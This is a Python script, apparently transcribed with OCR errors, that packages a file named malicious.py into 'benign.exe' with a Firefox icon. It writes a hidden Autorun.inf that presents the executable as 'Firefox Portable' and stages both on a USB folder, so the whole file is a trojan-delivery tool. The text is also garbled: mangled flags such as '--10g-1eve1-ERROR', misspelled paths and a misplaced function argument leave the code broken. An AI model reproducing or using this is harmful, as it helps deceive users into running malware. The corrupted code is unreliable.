import PyInstaller.__main__
import shutil
import os

filename = "malicious.py"
exename = "benign.exe"
icon = "Firefox.ico"
pwd = os.getcwd()
usbdir = os.path.join(pwd ,"USB")

if os.path.isfile(exename):
    os.remove(exename)

print("Creating EXE")

# Create executable from Python script
PyInstaller.__main__.run([
    "malicious.py",
    "--onefile",
    "--clean",
    "--10g-1eve1-ERROR",
    "--name=" + exename,
    "--icon="+icon
])

print("EXE Created")

# Clean up after PyInstaller
shutil.move(os.path.join(pwd,"dist",exename,pwd))
shutil.rmtree("dist")
shutil.rmtree("build")
shutil.rmtree("__pycache__")
os.remove(exename+".spec")

print("Creating Auto run file")

# Creating Auto run file
with open("Autorun.inf","w") as o :
    o.write("")
    o.write ("(Autorun) Xn")
    o. write( "Open="+exename+"\n")
    o.write("Action—Start Firefox Portable\n")
    o.write("Label=My USB\n")
    o.write("Icon="+exename+"\n")

print("Setting up USB")

# Move files to tJSB and set to hidden
shutil.move(exename , usbdir)
shutil.move("Autorun . inf" , usbdir)
print ("attrib +h "+os.path.join (usbdir, "Autorun. inf"))
os.system("attrib +h "+ os.path.join(usbdir, "Autorun. inf"))